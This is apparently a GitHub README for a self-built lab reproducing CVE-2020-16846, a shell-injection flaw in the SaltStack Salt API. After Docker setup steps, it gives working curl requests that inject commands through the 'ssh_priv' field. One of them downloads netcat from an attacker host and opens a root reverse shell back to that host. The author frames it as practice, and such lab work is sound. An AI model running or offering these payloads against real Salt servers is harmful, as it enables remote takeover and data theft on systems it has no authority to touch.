# CVE-2020-16846-Saltstack-Salt-API

Vulnerability Explained: An issue was discovered in SaltStack Salt through 3002. Sending crafted web requests to the Salt API, with the SSH client enabled, can result in shell injection. The details about this vulnerability can be found here:

https://www.zerodayinitiative.com/blog/2020/11/24/detailing-saltstack-salt-command-injection-vulnerabilities

For practice and learning purposes, I have decided to create a vulnerable instance and exploit it.

Vulnerable version: https://github.com/saltstack/salt/releases/tag/v3002

Tested on Ubuntu 20.04.03

## Instructions

Use the Dockerfile to create a vulnerable instance in Docker.

Run salt_setup.sh if want to create a vulnerable instance on an ubuntu VM. 

#### Build the image

> docker build -t salt-image .

####  
Run the container and expose ports (only 8080 is actually needed to be able to exploit it)

> docker run -p4506:4506 -p4505:4505 -p8000:8000 -it salt-image:latest

![api](img/api.png)

#### Exploitation

> curl -i $salt_ip_addr:$salt_api_port/run -H "Content-type: application/json" -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"|id>/tmp/test #"}'

![reverse_shell](img/rev_shell_payload.png)

Reverse shell

```
root@kali:~# curl -i $salt_ip_addr:$salt_api_port/run -H "Content-type: application/json" -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"| /usr/bin/wget http://$attacker_ip/nc -O /root/nc; chmod +x /root/nc; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/root/nc $attacker_ip $listener_port >/tmp/f  #"}'
```

![pwned](img/pwned.png)